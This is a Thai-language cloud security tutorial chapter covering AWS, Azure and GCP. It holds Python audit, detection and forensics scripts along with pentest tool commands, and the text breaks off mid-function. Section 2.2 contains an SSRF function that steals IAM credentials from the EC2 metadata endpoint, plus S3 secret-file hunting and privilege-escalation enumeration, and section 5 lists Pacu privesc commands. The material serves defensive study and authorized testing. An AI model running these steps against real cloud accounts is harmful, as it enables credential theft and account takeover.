# Part 89: Cloud Security (AWS / Azure / GCP)

## สารบัญ
1. [Cloud Security Fundamentals](#1-cloud-security-fundamentals)
2. [AWS Security](#2-aws-security)
3. [Azure Security](#3-azure-security)
4. [GCP Security](#4-gcp-security)
5. [Cloud Pentesting](#5-cloud-pentesting)
6. [Cloud Forensics](#6-cloud-forensics)
7. [Multi-Cloud Security Architecture](#7-multi-cloud-security)
8. [แบบฝึกหัด Lab](#8-lab)

---

## 1. Cloud Security Fundamentals

### 1.1 Shared Responsibility Model
```
On-Premises:   Customer รับผิดชอบทุกอย่าง
IaaS (EC2):    CSP: hardware, hypervisor
               Customer: OS, patches, network config, data, IAM
PaaS (RDS):    CSP: OS, database engine, hardware
               Customer: data, access control, network security
SaaS (Gmail):  CSP: แทบทุกอย่าง
               Customer: data, user accounts
```

### 1.2 Cloud Attack Surface
```
Identity (IAM)
  ├── Over-privileged roles
  ├── Leaked credentials (in code, logs, S3)
  └── Privilege escalation paths

Storage
  ├── Public S3/Blob/GCS buckets
  ├── Unencrypted data at rest
  └── Misconfigured bucket policies

Network
  ├── Security groups open to 0.0.0.0/0
  ├── No VPC segmentation
  └── Exposed metadata service (SSRF → credentials)

Compute
  ├── Unpatched EC2/VMs
  ├── User data scripts with hardcoded secrets
  └── IMDSv1 (vulnerable to SSRF)

Serverless/Containers
  ├── Lambda/Functions with broad IAM permissions
  ├── Container image vulnerabilities
  └── Secrets in environment variables
```

---

## 2. AWS Security

### 2.1 AWS Security Assessment
```python
#!/usr/bin/env python3
# aws_security_audit.py — ตรวจสอบความปลอดภัยของ AWS environment

import boto3
import json
from dataclasses import dataclass, field
from typing import List, Dict
from datetime import datetime, timezone, timedelta

@dataclass
class SecurityFinding:
    service: str
    severity: str   # CRITICAL, HIGH, MEDIUM, LOW
    title: str
    resource: str
    description: str
    remediation: str


class AWSSecurityAudit:
    def __init__(self, profile: str = None, region: str = "us-east-1"):
        session = boto3.Session(profile_name=profile, region_name=region)
        self.s3 = session.client("s3")
        self.iam = session.client("iam")
        self.ec2 = session.client("ec2")
        self.sts = session.client("sts")
        self.cloudtrail = session.client("cloudtrail")
        self.findings: List[SecurityFinding] = []

    def get_account_id(self) -> str:
        return self.sts.get_caller_identity()["Account"]

    # === S3 CHECKS ===

    def check_s3_public_buckets(self) -> List[SecurityFinding]:
        findings = []
        buckets = self.s3.list_buckets()["Buckets"]

        for bucket in buckets:
            name = bucket["Name"]
            try:
                # ตรวจ Block Public Access
                bpa = self.s3.get_public_access_block(Bucket=name)
                config = bpa["PublicAccessBlockConfiguration"]
                if not all(config.values()):
                    findings.append(SecurityFinding(
                        service="S3",
                        severity="HIGH",
                        title="S3 Bucket Block Public Access not fully enabled",
                        resource=f"arn:aws:s3:::{name}",
                        description=f"Bucket {name} does not have all Block Public Access settings enabled: {config}",
                        remediation="Enable all Block Public Access settings"
                    ))
            except self.s3.exceptions.NoSuchPublicAccessBlockConfiguration:
                findings.append(SecurityFinding(
                    service="S3",
                    severity="HIGH",
                    title="S3 Bucket has no Block Public Access configuration",
                    resource=f"arn:aws:s3:::{name}",
                    description=f"Bucket {name} has no public access block configured",
                    remediation="Enable Block Public Access settings"
                ))

            # ตรวจ bucket encryption
            try:
                self.s3.get_bucket_encryption(Bucket=name)
            except Exception:
                findings.append(SecurityFinding(
                    service="S3",
                    severity="MEDIUM",
                    title="S3 Bucket not encrypted",
                    resource=f"arn:aws:s3:::{name}",
                    description=f"Bucket {name} has no server-side encryption",
                    remediation="Enable SSE-S3 or SSE-KMS encryption"
                ))

        return findings

    # === IAM CHECKS ===

    def check_iam_users(self) -> List[SecurityFinding]:
        findings = []
        # credential report
        self.iam.generate_credential_report()
        import time; time.sleep(2)
        report = self.iam.get_credential_report()["Content"].decode("utf-8")

        import csv
        import io
        reader = csv.DictReader(io.StringIO(report))
        now = datetime.now(timezone.utc)

        for row in reader:
            if row["user"] == "<root_account>":
                # ตรวจ root MFA
                if row["mfa_active"] == "false":
                    findings.append(SecurityFinding(
                        service="IAM",
                        severity="CRITICAL",
                        title="Root account MFA not enabled",
                        resource="arn:aws:iam::root",
                        description="Root account does not have MFA enabled",
                        remediation="Enable MFA for root account immediately"
                    ))
                # ตรวจ root access keys
                if row["access_key_1_active"] == "true" or row["access_key_2_active"] == "true":
                    findings.append(SecurityFinding(
                        service="IAM",
                        severity="CRITICAL",
                        title="Root account has active access keys",
                        resource="arn:aws:iam::root",
                        description="Root account access keys should never be used",
                        remediation="Delete root account access keys"
                    ))
                continue

            # ตรวจ access key rotation
            for key_idx in ["1", "2"]:
                if row[f"access_key_{key_idx}_active"] == "true":
                    last_rotated = row.get(f"access_key_{key_idx}_last_rotated", "N/A")
                    if last_rotated != "N/A" and last_rotated != "not_supported":
                        try:
                            rotated_dt = datetime.fromisoformat(
                                last_rotated.replace("Z", "+00:00")
                            )
                            age_days = (now - rotated_dt).days
                            if age_days > 90:
                                findings.append(SecurityFinding(
                                    service="IAM",
                                    severity="HIGH",
                                    title=f"Access key older than 90 days",
                                    resource=f"arn:aws:iam:::user/{row['user']}",
                                    description=f"User {row['user']} key {key_idx} is {age_days} days old",
                                    remediation="Rotate access key"
                                ))
                        except Exception:
                            pass

        return findings

    def check_iam_policies(self) -> List[SecurityFinding]:
        """Check for overly permissive policies (* actions on * resources)"""
        findings = []
        paginator = self.iam.get_paginator("list_policies")
        for page in paginator.paginate(Scope="Local"):  # Customer-managed only
            for policy in page["Policies"]:
                try:
                    version = self.iam.get_policy_version(
                        PolicyArn=policy["Arn"],
                        VersionId=policy["DefaultVersionId"]
                    )["PolicyVersion"]["Document"]
                    for stmt in version.get("Statement", []):
                        if stmt.get("Effect") == "Allow":
                            actions = stmt.get("Action", [])
                            resources = stmt.get("Resource", [])
                            if actions == "*" or "*" in actions:
                                if resources == "*" or "*" in resources:
                                    findings.append(SecurityFinding(
                                        service="IAM",
                                        severity="CRITICAL",
                                        title="Policy allows * actions on * resources",
                                        resource=policy["Arn"],
                                        description=f"Policy {policy['PolicyName']} has wildcard allow",
                                        remediation="Apply principle of least privilege"
                                    ))
                except Exception:
                    pass
        return findings

    # === EC2 CHECKS ===

    def check_ec2_security_groups(self) -> List[SecurityFinding]:
        findings = []
        sgs = self.ec2.describe_security_groups()["SecurityGroups"]

        for sg in sgs:
            for rule in sg.get("IpPermissions", []):
                for ip_range in rule.get("IpRanges", []):
                    if ip_range["CidrIp"] == "0.0.0.0/0":
                        port = rule.get("FromPort", 0)
                        proto = rule.get("IpProtocol", "tcp")
                        severity = "HIGH"
                        if port in [22, 3389, 5985, 5986]:  # SSH, RDP, WinRM
                            severity = "CRITICAL"
                        findings.append(SecurityFinding(
                            service="EC2",
                            severity=severity,
                            title=f"Security Group open to 0.0.0.0/0 on port {port}",
                            resource=sg["GroupId"],
                            description=f"SG {sg['GroupId']} ({sg['GroupName']}) allows {proto}/{port} from any IP",
                            remediation="Restrict source to specific IPs or CIDR blocks"
                        ))
        return findings

    def check_imdsv1_usage(self) -> List[SecurityFinding]:
        """Check ว่า EC2 instances ใช้ IMDSv2 หรือไม่"""
        findings = []
        instances = self.ec2.describe_instances()
        for reservation in instances["Reservations"]:
            for inst in reservation["Instances"]:
                metadata_options = inst.get("MetadataOptions", {})
                http_tokens = metadata_options.get("HttpTokens", "optional")
                if http_tokens != "required":
                    findings.append(SecurityFinding(
                        service="EC2",
                        severity="MEDIUM",
                        title="EC2 instance uses IMDSv1 (vulnerable to SSRF)",
                        resource=inst["InstanceId"],
                        description=f"Instance {inst['InstanceId']} does not require IMDSv2",
                        remediation="Set HttpTokens=required to enforce IMDSv2"
                    ))
        return findings

    def run_full_audit(self) -> List[SecurityFinding]:
        print(f"[*] AWS Security Audit - Account: {self.get_account_id()}")
        self.findings.extend(self.check_s3_public_buckets())
        self.findings.extend(self.check_iam_users())
        self.findings.extend(self.check_iam_policies())
        self.findings.extend(self.check_ec2_security_groups())
        self.findings.extend(self.check_imdsv1_usage())

        # Summary
        by_severity = {}
        for f in self.findings:
            by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        print(f"[+] Findings: {by_severity}")
        return self.findings

    def export_report(self, path: str = "aws_audit.json"):
        data = [
            {
                "service": f.service, "severity": f.severity,
                "title": f.title, "resource": f.resource,
                "description": f.description, "remediation": f.remediation
            } for f in self.findings
        ]
        with open(path, "w") as fp:
            json.dump(data, fp, indent=2)
        print(f"[+] Report saved: {path}")


# ใช้งาน
audit = AWSSecurityAudit(profile="pentest", region="ap-southeast-1")
audit.run_full_audit()
audit.export_report()
```

### 2.2 AWS Cloud Pentesting
```python
#!/usr/bin/env python3
# aws_pentest.py — AWS Cloud Penetration Testing

import boto3
import json
import subprocess
from typing import List, Dict

class AWSPentest:
    """
    AWS Cloud Pentesting — ใช้เฉพาะการพาณิชย์/authorized assessments
    """

    def __init__(self, access_key: str = None, secret_key: str = None,
                 session_token: str = None, profile: str = None):
        if profile:
            self.session = boto3.Session(profile_name=profile)
        else:
            self.session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                aws_session_token=session_token
            )

    def enumerate_caller_identity(self) -> Dict:
        """ตรวจสอบ identity ของ credentials ที่ใช้"""
        sts = self.session.client("sts")
        identity = sts.get_caller_identity()
        print(f"[+] Account: {identity['Account']}")
        print(f"[+] UserID: {identity['UserId']}")
        print(f"[+] ARN: {identity['Arn']}")
        return identity

    def enumerate_iam_permissions(self) -> List[str]:
        """Enumerate permissions โดยใช้ enumerate_iam_permissions technique"""
        # เสาะ brute-force ดู permission ที่มี
        allowed_actions = []
        test_actions = [
            ("iam", "list_users"),
            ("iam", "list_roles"),
            ("iam", "list_policies"),
            ("s3", "list_buckets"),
            ("ec2", "describe_instances"),
            ("ec2", "describe_security_groups"),
            ("lambda", "list_functions"),
            ("rds", "describe_db_instances"),
            ("secretsmanager", "list_secrets"),
            ("ssm", "describe_parameters"),
        ]
        for service_name, method in test_actions:
            try:
                client = self.session.client(service_name)
                getattr(client, method)()
                allowed_actions.append(f"{service_name}:{method}")
                print(f"  [+] {service_name}:{method} — ALLOWED")
            except Exception:
                print(f"  [-] {service_name}:{method} — denied")
        return allowed_actions

    def enumerate_s3_buckets(self) -> List[Dict]:
        """Enumerate S3 buckets และตรวจหา sensitive data"""
        s3 = self.session.client("s3")
        findings = []
        try:
            buckets = s3.list_buckets()["Buckets"]
            print(f"[+] Found {len(buckets)} S3 buckets")
            for bucket in buckets:
                name = bucket["Name"]
                # ค้นหา sensitive files
                try:
                    objects = s3.list_objects_v2(Bucket=name, MaxKeys=100)
                    for obj in objects.get("Contents", []):
                        key = obj["Key"].lower()
                        sensitive_patterns = [
                            ".env", "password", "secret", "credential",
                            "private_key", "id_rsa", "backup", ".pem"
                        ]
                        for pattern in sensitive_patterns:
                            if pattern in key:
                                findings.append({
                                    "bucket": name,
                                    "key": obj["Key"],
                                    "size": obj["Size"],
                                    "issue": f"Sensitive file: {pattern}"
                                })
                except Exception:
                    pass
        except Exception as e:
            print(f"[-] S3 enum failed: {e}")
        return findings

    def check_secrets_manager(self) -> List[str]:
        """List Secrets Manager secrets"""
        client = self.session.client("secretsmanager")
        secrets = []
        try:
            paginator = client.get_paginator("list_secrets")
            for page in paginator.paginate():
                for secret in page["SecretList"]:
                    secrets.append(secret["Name"])
                    print(f"  [+] Secret: {secret['Name']}")
        except Exception as e:
            print(f"[-] Secrets Manager: {e}")
        return secrets

    def privilege_escalation_check(self) -> List[Dict]:
        """
        ค้นหา IAM privilege escalation paths
        เทคนิคจาก: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
        """
        iam = self.session.client("iam")
        paths = []

        # ตรวจ iam:CreatePolicyVersion
        try:
            iam.list_policy_versions(PolicyArn="arn:aws:iam::aws:policy/ReadOnlyAccess")
            # ถ้ามี iam:CreatePolicyVersion -> สร้าง version ใหม่ที่มี admin
            paths.append({
                "technique": "CreatePolicyVersion",
                "description": "Can create new policy version with admin access",
                "severity": "CRITICAL"
            })
        except Exception:
            pass

        # ตรวจ iam:CreateAccessKey
        try:
            users = iam.list_users()["Users"]
            for user in users[:3]:  # ตรวจ 3 คนแรก
                try:
                    # ถ้าสร้าง access key ให้ user อื่นได้ -> pivot
                    paths.append({
                        "technique": "CreateAccessKey",
                        "target_user": user["UserName"],
                        "description": f"Can create access key for {user['UserName']}",
                        "severity": "HIGH"
                    })
                    break
                except Exception:
                    pass
        except Exception:
            pass

        return paths

    def ssrf_metadata_exploit(
        self, ssrf_url: str
    ) -> Dict:
        """
        เหมาะสำหรับ: ถ้าพบ SSRF บน EC2 instance
        จะดึง IAM credentials จาก metadata endpoint
        """
        import requests
        try:
            # ดึง role name
            role_resp = requests.get(
                f"{ssrf_url}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                timeout=5
            )
            role_name = role_resp.text.strip()

            # ดึง credentials
            creds_resp = requests.get(
                f"{ssrf_url}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
                timeout=5
            )
            creds = creds_resp.json()
            print(f"[+] IAM Role: {role_name}")
            print(f"[+] Access Key: {creds.get('AccessKeyId')}")
            return creds
        except Exception as e:
            print(f"[-] SSRF exploit failed: {e}")
            return {}
```

### 2.3 CloudTrail Analysis
```python
#!/usr/bin/env python3
# cloudtrail_analysis.py — วิเคราะห์ CloudTrail logs หาความผิดปกติ

import boto3
import json
from datetime import datetime, timedelta, timezone
from collections import defaultdict

class CloudTrailAnalyzer:
    def __init__(self, profile: str = None, region: str = "us-east-1"):
        session = boto3.Session(profile_name=profile, region_name=region)
        self.ct = session.client("cloudtrail")

    def get_events(
        self, hours: int = 24, event_name: str = None
    ) -> list:
        """ดึง CloudTrail events ช่วง N ชั่วโมงที่ผ่านมา"""
        start = datetime.now(timezone.utc) - timedelta(hours=hours)
        kwargs = {"StartTime": start, "MaxResults": 50}
        if event_name:
            kwargs["LookupAttributes"] = [
                {"AttributeKey": "EventName", "AttributeValue": event_name}
            ]
        events = []
        paginator = self.ct.get_paginator("lookup_events")
        for page in paginator.paginate(**{k: v for k, v in kwargs.items() if k != "MaxResults"}):
            events.extend(page["Events"])
        return events

    def detect_root_usage(self, hours: int = 24) -> list:
        """ตรวจจับการใช้ root account"""
        events = self.get_events(hours)
        return [
            e for e in events
            if e.get("Username") == "root"
        ]

    def detect_iam_changes(self, hours: int = 24) -> list:
        """ตรวจจับการเปลี่ยนแปลง IAM"""
        iam_events = [
            "CreateUser", "DeleteUser", "CreateRole", "DeleteRole",
            "AttachUserPolicy", "AttachRolePolicy", "CreateAccessKey",
            "CreatePolicyVersion", "SetDefaultPolicyVersion",
            "AddUserToGroup", "CreateLoginProfile"
        ]
        events = self.get_events(hours)
        return [
            {
                "time": e["EventTime"].isoformat(),
                "event": e["EventName"],
                "user": e.get("Username", "unknown"),
                "resource": e.get("Resources", [])
            }
            for e in events if e["EventName"] in iam_events
        ]

    def detect_suspicious_api_calls(self, hours: int = 4) -> list:
        """ตรวจจับ API calls ที่น่าสงสัย"""
        SUSPICIOUS = [
            "StopLogging",          # ปิด CloudTrail
            "DeleteTrail",           # ลบ CloudTrail
            "DisableKey",            # ปิด KMS key
            "ScheduleKeyDeletion",   # ลบ KMS key
            "DeleteBucket",          # ลบ S3 bucket
            "PutBucketPolicy",       # เปลี่ยน bucket policy
            "AuthorizeSecurityGroup",  # เปิด security group
            "CreateKeyPair",          # สร้าง key pair ใหม่
            "RunInstances",           # รัน EC2 instance
            "ConsoleLogin",           # login ผ่าน console
        ]
        events = self.get_events(hours)
        return [
            {
                "time": e["EventTime"].isoformat(),
                "event": e["EventName"],
                "user": e.get("Username", "unknown"),
                "source_ip": json.loads(e.get("CloudTrailEvent", "{}")).get(
                    "sourceIPAddress", "unknown"
                )
            }
            for e in events if e["EventName"] in SUSPICIOUS
        ]

    def detect_credential_exfiltration(self, hours: int = 24) -> list:
        """ตรวจจับการดึง credentials ออก"""
        CRED_EVENTS = [
            "GetSecretValue",           # Secrets Manager
            "GetParameter",             # SSM Parameter Store
            "GetParametersByPath",
            "Decrypt",                  # KMS Decrypt
            "GenerateDataKey",
        ]
        events = self.get_events(hours)
        user_counts = defaultdict(int)
        findings = []
        for e in events:
            if e["EventName"] in CRED_EVENTS:
                user = e.get("Username", "unknown")
                user_counts[user] += 1
        for user, count in user_counts.items():
            if count > 20:
                findings.append({
                    "user": user,
                    "count": count,
                    "risk": "potential_credential_exfiltration"
                })
        return findings
```

---

## 3. Azure Security

### 3.1 Azure Security Assessment
```python
#!/usr/bin/env python3
# azure_security.py — ตรวจสอบความปลอดภัยของ Azure environment

from azure.identity import ClientSecretCredential, DefaultAzureCredential
from azure.mgmt.resource import ResourceManagementClient
from azure.mgmt.security import SecurityCenter
from azure.mgmt.network import NetworkManagementClient
from azure.mgmt.storage import StorageManagementClient
from azure.mgmt.authorization import AuthorizationManagementClient
import json
from typing import List, Dict

class AzureSecurityAudit:
    def __init__(self, subscription_id: str, tenant_id: str = None,
                 client_id: str = None, client_secret: str = None):
        self.subscription_id = subscription_id
        if tenant_id and client_id and client_secret:
            cred = ClientSecretCredential(tenant_id, client_id, client_secret)
        else:
            cred = DefaultAzureCredential()  # ใช้ az login

        self.network = NetworkManagementClient(cred, subscription_id)
        self.storage = StorageManagementClient(cred, subscription_id)
        self.auth = AuthorizationManagementClient(cred, subscription_id)
        self.security = SecurityCenter(cred, subscription_id)
        self.findings = []

    def check_network_security_groups(self) -> List[Dict]:
        """Check NSGs สำหรับ rules ที่อนุญาตมากเกินไป"""
        findings = []
        for nsg in self.network.network_security_groups.list_all():
            for rule in nsg.security_rules or []:
                if (rule.access == "Allow" and
                    rule.direction == "Inbound" and
                    rule.source_address_prefix in ["*", "Internet", "0.0.0.0/0"]):
                    port = rule.destination_port_range
                    severity = "HIGH"
                    if port in ["22", "3389", "5985"]:  # SSH, RDP, WinRM
                        severity = "CRITICAL"
                    findings.append({
                        "service": "NSG",
                        "severity": severity,
                        "resource": nsg.id,
                        "rule": rule.name,
                        "port": port,
                        "issue": f"Inbound allow from Internet to port {port}"
                    })
        return findings

    def check_storage_accounts(self) -> List[Dict]:
        """Check Storage Accounts สำหรับ misconfigurations"""
        findings = []
        for account in self.storage.storage_accounts.list():
            # HTTPS only?
            if not account.enable_https_traffic_only:
                findings.append({
                    "service": "Storage",
                    "severity": "HIGH",
                    "resource": account.id,
                    "issue": "HTTP traffic allowed (should be HTTPS only)"
                })
            # Public Blob Access
            if account.allow_blob_public_access:
                findings.append({
                    "service": "Storage",
                    "severity": "HIGH",
                    "resource": account.id,
                    "issue": "Public Blob access enabled"
                })
            # Encryption in transit (TLS version)
            min_tls = getattr(account, 'minimum_tls_version', None)
            if min_tls and min_tls != "TLS1_2":
                findings.append({
                    "service": "Storage",
                    "severity": "MEDIUM",
                    "resource": account.id,
                    "issue": f"TLS version {min_tls} — should be TLS1_2"
                })
        return findings

    def check_rbac_overuse(self) -> List[Dict]:
        """Check สำหรับ Owner/Contributor roles ที่บุคคลไม่ควรได้รับ"""
        findings = []
        try:
            assignments = self.auth.role_assignments.list_for_subscription()
            for assignment in assignments:
                role_def_id = assignment.role_definition_id.split("/")[-1]
                # Owner role ID: 8e3af657-a8ff-443c-a75c-2fe8c4bcb635
                # Contributor: b24988ac-6180-42a0-ab88-20f7382dd24c
                PRIVILEGED_ROLES = [
                    "8e3af657-a8ff-443c-a75c-2fe8c4bcb635",  # Owner
                    "b24988ac-6180-42a0-ab88-20f7382dd24c",  # Contributor
                    "18d7d88d-d35e-4fb5-a5c3-7773c20a72d9",  # User Access Admin
                ]
                if role_def_id in PRIVILEGED_ROLES:
                    findings.append({
                        "service": "RBAC",
                        "severity": "HIGH",
                        "resource": assignment.scope,
                        "principal": assignment.principal_id,
                        "role": role_def_id,
                        "issue": "Overly privileged role assignment"
                    })
        except Exception as e:
            print(f"[-] RBAC check error: {e}")
        return findings
```

---

## 4. GCP Security

### 4.1 GCP Security Assessment
```python
#!/usr/bin/env python3
# gcp_security.py — ตรวจสอบความปลอดภัยของ GCP environment

from google.cloud import storage, compute_v1, iam_v1
from googleapiclient import discovery
import json
from typing import List, Dict

class GCPSecurityAudit:
    def __init__(self, project_id: str):
        self.project_id = project_id
        self.storage_client = storage.Client(project=project_id)
        self.compute = compute_v1.InstancesClient()
        self.fw_client = compute_v1.FirewallsClient()
        self.findings = []

    def check_gcs_buckets(self) -> List[Dict]:
        """Check GCS buckets สำหรับ public access"""
        findings = []
        for bucket in self.storage_client.list_buckets():
            # Check IAM policy
            policy = bucket.get_iam_policy(requested_policy_version=3)
            for binding in policy.bindings:
                if "allUsers" in binding.members or "allAuthenticatedUsers" in binding.members:
                    findings.append({
                        "service": "GCS",
                        "severity": "CRITICAL",
                        "resource": f"gs://{bucket.name}",
                        "role": binding.role,
                        "issue": "Bucket accessible to all users"
                    })
        return findings

    def check_firewall_rules(self) -> List[Dict]:
        """Check Firewall rules สำหรับ overly permissive rules"""
        findings = []
        for rule in self.fw_client.list(project=self.project_id):
            if rule.direction == "INGRESS" and not rule.disabled:
                for range_item in rule.source_ranges or []:
                    if range_item in ["0.0.0.0/0", "::/0"]:
                        for allowed in rule.allowed or []:
                            ports = list(allowed.ports) if allowed.ports else ["all"]
                            severity = "HIGH"
                            if any(p in ["22", "3389"] for p in ports):
                                severity = "CRITICAL"
                            findings.append({
                                "service": "Firewall",
                                "severity": severity,
                                "resource": rule.self_link,
                                "ports": ports,
                                "issue": f"Inbound from 0.0.0.0/0 on ports {ports}"
                            })
        return findings

    def check_service_account_keys(self) -> List[Dict]:
        """Check Service Account ที่มี key เก่า"""
        findings = []
        from google.cloud import iam_credentials_v1
        from datetime import datetime, timezone, timedelta

        service = discovery.build("iam", "v1")
        sa_list = service.projects().serviceAccounts().list(
            name=f"projects/{self.project_id}"
        ).execute()

        now = datetime.now(timezone.utc)
        for sa in sa_list.get("accounts", []):
            keys = service.projects().serviceAccounts().keys().list(
                name=sa["name"], keyTypes=["USER_MANAGED"]
            ).execute()
            for key in keys.get("keys", []):
                created = datetime.fromisoformat(
                    key["validAfterTime"].replace("Z", "+00:00")
                )
                age_days = (now - created).days
                if age_days > 90:
                    findings.append({
                        "service": "IAM",
                        "severity": "HIGH",
                        "resource": key["name"],
                        "age_days": age_days,
                        "issue": f"Service Account key older than 90 days ({age_days} days)"
                    })
        return findings
```

---

## 5. Cloud Pentesting

### 5.1 ScoutSuite / Prowler / Pacu
```bash
# === ScoutSuite — Multi-Cloud Security Auditing ===
pip install scoutsuite

# AWS
scout aws --profile pentest --report-dir ./scoutsuite_report

# Azure
scout azure --cli --subscription-ids <sub-id>

# GCP
scout gcp --user-account --project <project-id>

# === Prowler — AWS Security Tool ===
pip install prowler
prowler aws -M csv,html -S --compliance cis_level2_1.4_aws

# === Pacu — AWS Exploitation Framework ===
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip install -r requirements.txt
python3 pacu.py

# ใน Pacu shell:
Pacu> import_keys --all-profiles
Pacu> run iam__enum_permissions
Pacu> run iam__privesc_scan
Pacu> run s3__bucket_finder
Pacu> run ec2__enum_instances
Pacu> run lambda__enum

# === CloudFox — Cloud Pentesting Tool ===
go install github.com/BishopFox/cloudfox@latest
cloudfox aws --profile pentest all-checks
cloudfox aws --profile pentest instances
cloudfox aws --profile pentest permissions
cloudfox aws --profile pentest secrets

# === SkyArk — Azure Pentesting ===
git clone https://github.com/cyberark/SkyArk
cd SkyArk
Import-Module .\SkyArk.ps1 -force
Start-AzureStealth  # สแกนหา privileged users ที่ซ่อนอยู่
```

---

## 6. Cloud Forensics

### 6.1 AWS Incident Response
```python
#!/usr/bin/env python3
# cloud_forensics.py — Cloud incident response และ forensics

import boto3
import json
from datetime import datetime, timezone
from pathlib import Path

class AWSForensics:
    """
    AWS Incident Response — เก็บหลักฐานและตรวจสอบ
    """

    def __init__(self, profile: str = None, region: str = "us-east-1"):
        self.session = boto3.Session(profile_name=profile, region_name=region)
        self.ec2 = self.session.client("ec2")
        self.s3 = self.session.client("s3")
        self.evidence_bucket = f"forensics-{datetime.now().strftime('%Y%m%d%H%M%S')}"

    def isolate_instance(self, instance_id: str) -> bool:
        """
        แยก EC2 instance จากเครือข่ายสำหรับ forensics
        1. Create forensics security group (deny all)
        2. Replace existing SGs
        3. Tag instance as under investigation
        """
        # สร้าง forensics SG (deny all inbound)
        vpc_id = self.ec2.describe_instances(
            InstanceIds=[instance_id]
        )["Reservations"][0]["Instances"][0]["VpcId"]

        sg = self.ec2.create_security_group(
            GroupName=f"forensics-isolation-{instance_id}",
            Description="Forensics isolation - deny all traffic",
            VpcId=vpc_id
        )
        sg_id = sg["GroupId"]

        # Remove default egress rule
        self.ec2.revoke_security_group_egress(
            GroupId=sg_id,
            IpPermissions=[{"IpProtocol": "-1", "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}]
        )

        # เปลี่ยน SG ของ instance
        self.ec2.modify_instance_attribute(
            InstanceId=instance_id,
            Groups=[sg_id]
        )

        # Tag instance
        self.ec2.create_tags(
            Resources=[instance_id],
            Tags=[
                {"Key": "Status", "Value": "ForensicsInvestigation"},
                {"Key": "IsolatedAt", "Value": datetime.utcnow().isoformat()}
            ]
        )
        print(f"[+] Instance {instance_id} isolated with SG {sg_id}")
        return True

    def snapshot_disk(
        self, instance_id: str, evidence_description: str
    ) -> str:
        """สร้าง EBS snapshot เพื่อเป็น forensic evidence"""
        # เก็บ volume IDs
        instance = self.ec2.describe_instances(
            InstanceIds=[instance_id]
        )["Reservations"][0]["Instances"][0]
        volumes = [b["Ebs"]["VolumeId"]
                   for b in instance.get("BlockDeviceMappings", [])]

        snapshot_ids = []
        for vol_id in volumes:
            snap = self.ec2.create_snapshot(
                VolumeId=vol_id,
                Description=f"Forensics: {evidence_description}",
                TagSpecifications=[{
                    "ResourceType": "snapshot",
                    "Tags": [
                        {"Key": "ForensicsCase", "Value": evidence_description},
                        {"Key": "SourceInstance", "Value": instance_id},
                        {"Key": "CreatedAt", "Value": datetime.utcnow().isoformat()}
                    ]
                }]
            )
            snapshot_ids.append(snap["SnapshotId"])
            print(f"[+] Snapshot created: {snap['SnapshotId']} from {vol_id}")

        return snapshot_ids

    def collect_cloudtrail_evidence(
        self, s3_bucket: str, prefix: str,
        output_dir: str = "./cloudtrail_evidence"
    ):
        """ดาวน์โหลด CloudTrail logs จาก S3"""
        Path(output_dir).mkdir(exist_ok=True)
        paginator = self.s3.get_paginator("list_objects_v2")
        count = 0
        for page in paginator.paginate(Bucket=s3_bucket, Prefix=prefix):
            for obj in page.get("Contents", []):
                key = obj["Key"]
                filename = Path(output_dir) / key.replace("/", "_")
                self.s3.download_file(s3_bucket, key, str(filename))
                count += 1
        print(f"[+] Downloaded {count} CloudTrail log files to {output_dir}")

    def analyze_vpc_flow_logs(
        self, log_group: str, hours: int = 24
    ) -> list:
        """Analyze VPC Flow Logs หา suspicious traffic"""
        logs = self.session.client("logs")
        from datetime import timedelta
        import time

        start = int((datetime.now(timezone.utc) - timedelta(hours=hours)).timestamp() * 1000)
        end = int(datetime.now(timezone.utc).timestamp() * 1000)

        # Query: หา traffic ที่ถูก REJECT
        query = logs.start_query(
            logGroupName=log_group,
            startTime=start,
            endTime=end,
            queryString="""
                fields @timestamp, srcAddr, dstAddr, dstPort, action, bytes
                | filter action = 'REJECT'
                | stats count() as reject_count by srcAddr, dstPort
                | sort reject_count desc
                | limit 50
            """
        )
        query_id = query["queryId"]

        # รอผล
        while True:
            result = logs.get_query_results(queryId=query_id)
            if result["status"] in ["Complete", "Failed"]:
                break
            time.sleep(2)

        return result.get("results", [])
```

---

## 7. Multi-Cloud Security

### 7.1 Cloud Security Posture Management (CSPM)
```python
#!/usr/bin/env python3
# cspm.py — Cloud Security Posture Management ครอบคลุมหลาย cloud

from dataclasses import dataclass, field
from typing import List, Dict
import json

@dataclass
class CloudFinding:
    cloud: str          # AWS, Azure, GCP
    account: str
    service: str
    severity: str
    title: str
    resource: str
    description: str
    remediation: str
    compliance: List[str] = field(default_factory=list)  # CIS, SOC2, PCI-DSS


class MultiCloudCSPM:
    """
    Unified CSPM สำหรับดูภาพรวมหลาย cloud
    """

    def __init__(self):
        self.all_findings: List[CloudFinding] = []

    def add_findings(self, cloud: str, account: str, findings: list):
        for f in findings:
            self.all_findings.append(CloudFinding(
                cloud=cloud,
                account=account,
                **f
            ))

    def get_risk_score(self) -> Dict:
        WEIGHTS = {"CRITICAL": 10, "HIGH": 5, "MEDIUM": 2, "LOW": 1}
        by_cloud = {}
        for f in self.all_findings:
            if f.cloud not in by_cloud:
                by_cloud[f.cloud] = 0
            by_cloud[f.cloud] += WEIGHTS.get(f.severity, 0)
        return by_cloud

    def get_compliance_coverage(self) -> Dict:
        frameworks = {"CIS": [], "SOC2": [], "PCI-DSS": [], "ISO27001": []}
        for f in self.all_findings:
            for framework in f.compliance:
                if framework in frameworks:
                    frameworks[framework].append(f.title)
        return {k: len(v) for k, v in frameworks.items()}

    def generate_dashboard(self) -> str:
        critical = [f for f in self.all_findings if f.severity == "CRITICAL"]
        high = [f for f in self.all_findings if f.severity == "HIGH"]
        risk_by_cloud = self.get_risk_score()

        dashboard = f"""# Multi-Cloud Security Dashboard

## Risk Summary
| Cloud | Risk Score | Critical | High |
|---|---|---|---|
"""
        for cloud in {"AWS", "Azure", "GCP"}:
            c_count = sum(1 for f in critical if f.cloud == cloud)
            h_count = sum(1 for f in high if f.cloud == cloud)
            dashboard += f"| {cloud} | {risk_by_cloud.get(cloud, 0)} | {c_count} | {h_count} |\n"

        dashboard += "\n## Critical Findings\n"
        for f in critical:
            dashboard += f"- **[{f.cloud}]** {f.title} — `{f.resource}`\n"

        compliance = self.get_compliance_coverage()
